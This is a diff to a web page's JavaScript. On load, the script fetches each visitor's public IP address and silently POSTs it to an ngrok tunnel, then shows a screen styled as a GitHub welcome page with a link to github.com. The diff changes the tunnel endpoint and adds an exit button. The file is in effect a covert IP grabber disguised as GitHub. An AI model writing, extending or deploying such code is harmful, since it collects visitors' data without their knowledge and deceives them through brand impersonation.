@@ -13,7 +13,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 .then(data => data.ip);
 
             // Send IP Address to Server
-            const response = await fetch('https://969d-102-22-168-100.ngrok-free.app', {
+            const response = await fetch('https://8a90-102-22-168-100.ngrok-free.app', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -24,11 +24,12 @@ document.addEventListener("DOMContentLoaded", () => {
             });
 
             if (response.ok) {
-                // Show the welcome message and buttons with GitHub info on success
+                // Update the UI to show the welcome message and buttons with GitHub info
                 document.querySelector('.message').innerHTML = `
                     <p id="welcome">WELCOME</p>
                     <p id="description">To GitHub</p>
                     <button id="join-now">Join Now</button>
+                    <button id="exit">EXIT</button>
                     <div id="additional-info">
                         <p>Join a global community of developers and open-source enthusiasts.</p>
                         <p>Collaborate seamlessly on projects, big or small.</p>
@@ -45,18 +46,22 @@ document.addEventListener("DOMContentLoaded", () => {
                 document.getElementById('join-now').addEventListener('click', () => {
                     window.location.href = 'https://github.com/';
                 });
+
+                // Exit button logic
+                document.getElementById('exit').addEventListener('click', () => {
+                    window.close();
+                });
+
             } else {
-                // Show "Failed to connect" message on failure
+                // Show connection error message without a block
                 document.querySelector('.message').innerHTML = `
                     <p id="status">Failed to connect to website</p>
-                    <p id="sub-status">That's all we know</p>
                 `;
             }
         } catch (error) {
-            // Show "Failed to connect" message if there's a network error
+            // Show connection error message without a block
             document.querySelector('.message').innerHTML = `
                 <p id="status">Failed to connect to website</p>
-                <p id="sub-status">That's all we know</p>
             `;
         }
     };
